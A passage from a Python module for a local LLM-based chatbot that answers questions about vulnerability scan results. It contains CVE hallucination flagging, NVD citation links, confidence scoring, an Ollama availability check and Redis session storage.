                for item in metadatas:
                    if isinstance(item, dict):
                        cve_id = item.get('cve_id')
                        if cve_id and isinstance(cve_id, str):
                            context_cves.add(cve_id)
            
            except Exception as e:
                logger.warning(f"Error extracting context CVEs: {e}")
                # Safe fallback - assume no hallucination
                return llm_response, False
            
            # Detect hallucinated CVEs
            hallucinated_cves = mentioned_cves - context_cves
            
            if hallucinated_cves:
                # Add compact disclaimer about hallucinations
                cve_sample = ', '.join(sorted(list(hallucinated_cves))[:3])
                
                logger.warning(f"Detected CVEs outside context: {cve_sample}")
                
                # Add subtle warning (moved to end, compact format)
                disclaimer = (
                    f"\n\nNote: Some CVE references may be from general knowledge, "
                    f"not your scanned data. Verify before acting: {cve_sample}"
                )
                
                llm_response += disclaimer
                
                # Clean markdown formatting
                llm_response = self._clean_markdown_formatting(llm_response)
                return llm_response, True
            
            # All mentioned CVEs are in context - clean and return
            llm_response = self._clean_markdown_formatting(llm_response)
            return llm_response, False
        
        except Exception as e:
            logger.error(f"Hallucination detection failed: {e}")
            # On error, return original response (safer than false positives)
            return llm_response, False
    
    def _format_citations(self, response: str) -> str:
        """Format CVE IDs as clickable links"""
        # Replace CVE-XXXX-XXXXX with markdown links
        def replace_cve(match):
            cve_id = match.group(0)
            url = f"https://nvd.nist.gov/vuln/detail/{cve_id}"
            return f"[{cve_id}]({url})"
        
        formatted = re.sub(r'CVE-\d{4}-\d{4,}', replace_cve, response, flags=re.IGNORECASE)
        
        return formatted
    
    def _extract_sources(self, retrieval_results: Dict) -> List[Dict]:
        """Extract source citations from retrieval results"""
        sources = []
        
        try:
            # From vulnerability scans
            vuln_results = retrieval_results.get('vulnerability_results', {})
            if isinstance(vuln_results, dict):
                for meta in vuln_results.get('metadatas', []):
                    if isinstance(meta, dict):
                        sources.append({
                            'type': 'vulnerability_scan',
                            'cve_id': meta.get('cve_id'),
                            'host_ip': meta.get('host_ip'),
                            'cvss_score': meta.get('cvss_score'),
                            'severity': meta.get('severity'),
                            'tool': meta.get('tool_name'),
                            'url': f"https://nvd.nist.gov/vuln/detail/{meta.get('cve_id')}" if meta.get('cve_id') else '#'
                        })
            
            # From threat intelligence
            threat_results = retrieval_results.get('threat_intel_results')
            if threat_results and isinstance(threat_results, dict):
                for meta in threat_results.get('metadatas', []):
                    if isinstance(meta, dict):
                        sources.append({
                            'type': 'threat_intelligence',
                            'cve_id': meta.get('cve_id'),
                            'source': meta.get('source'),
                            'url': f"https://nvd.nist.gov/vuln/detail/{meta.get('cve_id')}" if meta.get('cve_id') else '#'
                        })
        except Exception as e:
            logger.error(f"Error extracting sources: {e}")
        
        return sources
    
    def _calculate_confidence(
        self,
        retrieval_results: Dict,
        hallucination_detected: bool
    ) -> float:
        """
        Calculate confidence score (0.0 - 1.0).
        
        Factors:
        - Retrieval quality (avg semantic similarity)
        - Number of relevant documents retrieved
        - Hallucination penalty
        - Query intent specificity
        
        Scoring:
        - 0.9+: Excellent - Many docs with high relevance, no hallucinations
        - 0.7-0.9: Good - Multiple docs or high relevance, aligned with context
        - 0.5-0.7: Fair - Some docs or moderate relevance
        - <0.5: Poor - Few/no docs, general knowledge response
        """
        try:
            # Get retrieval quality metrics
            vuln_results = retrieval_results.get('vulnerability_results', {})
            distances = vuln_results.get('distances', []) if isinstance(vuln_results, dict) else []
            doc_count = retrieval_results.get('total_docs_retrieved', 0)
            query_context = retrieval_results.get('query_context')
            
            # Calculate retrieval quality (based on semantic similarity)
            if distances and isinstance(distances, list) and len(distances) > 0:
                # ChromaDB uses cosine distance: 0.0 = perfect match, 2.0 = dissimilar
                # Convert to similarity: 1.0 - distance (clamped to 0-1)
                similarities = [max(0.0, 1.0 - d) for d in distances]
                avg_similarity = sum(similarities) / len(similarities)
                retrieval_quality = avg_similarity  # 0.0-1.0
            else:
                # No documents retrieved = lower confidence
                retrieval_quality = 0.0
            
            # Document count factor (improved - less harsh penalties)
            if doc_count >= 5:
                doc_count_factor = 1.0  # Excellent
            elif doc_count >= 3:
                doc_count_factor = 0.85  # Good
            elif doc_count >= 1:
                doc_count_factor = 0.65  # Fair (improved from 0.6)
            else:
                doc_count_factor = 0.40  # General knowledge (improved from 0.3)
            
            # Real-time data bonus (increased)
            has_realtime = retrieval_results.get('has_realtime_data', False)
            realtime_bonus = 0.20 if has_realtime else 0.0  # Increased from 0.15
            
            # Query specificity factor
            query_intent = query_context.intent if hasattr(query_context, 'intent') else 'general'
            if query_intent == 'vulnerability_lookup':
                specificity_factor = 1.0
            elif query_intent == 'attack_path':
                specificity_factor = 0.95
            elif query_intent == 'remediation':
                specificity_factor = 0.9
            else:
                specificity_factor = 0.70  # General queries (improved from 0.75)
            
            # Hallucination penalty (reduced)
            hallucination_penalty = 0.15 if hallucination_detected else 0.0  # Reduced from 0.25
            
            # Weighted combination with improved floor
            base_confidence = (
                retrieval_quality * 0.35 +      # 35% - semantic relevance
                doc_count_factor * 0.30 +       # 30% - document count
                specificity_factor * 0.20 +     # 20% - query specificity
                0.15                             # 15% - base floor (NEW)
            )
            
            # Add real-time bonus
            confidence = base_confidence + realtime_bonus - hallucination_penalty
            
            # Clamp to realistic range (minimum 0.30 for valid responses with base floor)
            confidence = max(0.30, min(confidence, 0.98))
            
            logger.debug(
                f"Confidence calc: quality={retrieval_quality:.2f}, "
                f"docs={doc_count_factor:.2f}, specificity={specificity_factor:.2f}, "
                f"halluc_penalty={hallucination_penalty:.2f} → {confidence:.2f}"
            )
            
            return round(confidence, 2)
        except Exception as e:
            logger.error(f"Error calculating confidence: {e}")
            return 0.5
    
    def _verify_ollama(self) -> bool:
        """Verify Ollama server is accessible. Returns True if OK, False if error."""
        try:
            response = requests.get(f"{self.ollama_base_url}/api/tags", timeout=5)
            
            if response.status_code != 200:
                logger.error(f"Ollama API error: HTTP {response.status_code}")
                return False
            
            try:
                data = response.json()
                models = data.get('models', [])
                
                # Validate response structure
                if not isinstance(models, list):
                    logger.error(f"Unexpected Ollama response format")
                    return False
                
                # Extract model names safely
                model_names = []
                for m in models:
                    if isinstance(m, dict) and 'name' in m:
                        model_names.append(m['name'])
                
                # Check if our model is available
                if self.model_name not in model_names:
                    logger.error(f"Model '{self.model_name}' not found")
                    logger.error(f"Available models: {model_names}")
                    logger.error(f"Install with: ollama pull {self.model_name}")
                    return False
                
                logger.info(f"✓ Ollama OK - Model '{self.model_name}' ready")
                return True
            
            except (ValueError, KeyError, TypeError) as e:
                logger.error(f"Failed to parse Ollama response: {e}")
                return False
        
        except requests.exceptions.ConnectionError as e:
            logger.error(f"Cannot connect to Ollama at {self.ollama_base_url}")
            logger.error(f"Fix: Start Ollama with: ollama serve")
            return False
        
        except requests.exceptions.Timeout:
            logger.error(f"Ollama timeout at {self.ollama_base_url}")
            logger.error(f"Server may be busy or unresponsive")
            return False
        
        except Exception as e:
            logger.error(f"Unexpected Ollama error: {e}")
            return False
    
    def get_session(self, session_id: str) -> Optional[ChatSession]:
        """Get session by ID from storage"""
        if self.use_redis and self.redis_client:
            try:
                session_data = self.redis_client.get(f"session:{session_id}")
                if session_data:
                    data = json.loads(session_data)
                    messages = [
                        ChatMessage(
                            role=msg['role'],
                            content=msg['content'],
                            timestamp=msg.get('timestamp'),
                            sources=msg.get('sources', [])
                        )
                        for msg in data.get('messages', [])
                    ]
                    return ChatSession(
                        session_id=session_id,
                        messages=messages,
                        created_at=data.get('created_at')
                    )
            except Exception as e:
                logger.error(f"Error retrieving session from Redis: {e}")
        
        # Fallback to in-memory
        return self.sessions.get(session_id) if hasattr(self, 'sessions') else None
    
    def _save_session(self, session: ChatSession) -> None:
        """Save session to storage"""
        if self.use_redis and self.redis_client:
            try:
                session_data = {
                    'session_id': session.session_id,
                    'created_at': session.created_at,
                    'messages': [
                        {
                            'role': msg.role,
                            'content': msg.content,
                            'timestamp': msg.timestamp,
                            'sources': msg.sources
                        }
                        for msg in session.messages
                    ]
                }
                self.redis_client.setex(
                    f"session:{session.session_id}",
                    self.session_ttl,
                    json.dumps(session_data)
                )
            except Exception as e:
                logger.error(f"Error saving session to Redis: {e}")
        else:
            # In-memory fallback
            if hasattr(self, 'sessions'):
                self.sessions[session.session_id] = session
    
    def clear_session(self, session_id: str) -> bool:
        """Clear conversation history for session"""
        if self.use_redis and self.redis_client:
            try:
                self.redis_client.delete(f"session:{session_id}")
                return True
            except Exception as e:
                logger.error(f"Error deleting session from Redis: {e}")
                return False
        else:
            if hasattr(self, 'sessions') and session_id in self.sessions:
                del self.sessions[session_id]
                return True
        return False


# Example usage
if __name__ == '__main__':
    from indexing import VulnerabilityIndexer
    from retrieval_engine import RAGRetrievalEngine
    
    # Initialize components
    indexer = VulnerabilityIndexer(persist_directory="./test_chroma_db")
    engine = RAGRetrievalEngine(indexer)
    chatbot = RAGChatbot(engine)
    
    # Test queries
    test_queries = [
        "What are the critical vulnerabilities on host 192.168.1.50?",
        "How severe is CVE-2023-12345 and how do I fix it?",
        "Show me attack paths that could lead to database compromise"
    ]
    
    session_id = None
    for i, query in enumerate(test_queries, 1):
        print(f"\n{'='*70}")
        print(f"Query {i}: {query}")
        print(f"{'='*70}")
        
        result = chatbot.query(query, session_id=session_id)
        session_id = result['session_id']  # Continue conversation
        
        print(f"\nResponse:")
        print(result['response'])
        print(f"\nConfidence: {result['confidence']:.2%}")
        print(f"Sources: {len(result['sources'])}")
        print(f"Intent: {result['query_intent']}")
        
        if result['sources']:
            print("\nTop Sources:")
            for source in result['sources'][:3]:
                print(f"  - {source.get('cve_id')}: {source.get('url')}")
